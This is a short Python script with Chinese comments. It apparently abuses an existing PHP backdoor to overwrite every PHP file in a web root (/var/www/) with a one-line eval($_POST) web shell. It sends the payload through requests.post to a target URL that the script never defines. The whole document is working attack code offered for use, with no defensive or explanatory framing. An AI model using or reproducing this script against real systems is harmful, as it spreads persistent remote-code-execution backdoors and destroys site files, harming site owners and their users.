# -*- coding:utf-8 -*-
#把这个丢进源码文件里

import requests
import os


#获取根目录下所有php文件
basedir = os.listdir('./')

li = []
for i in basedir:
	
	if i[-4:] == '.php':

		li.append("/var/www/"+i)
#print(li)

#
php_code = '''
system(\'echo "<?php eval($_POST[\\'tinmin\\']);?>" > %s\');
'''
for j in li:
	r = requests.post(url,data={'tinmin':php_code%j})

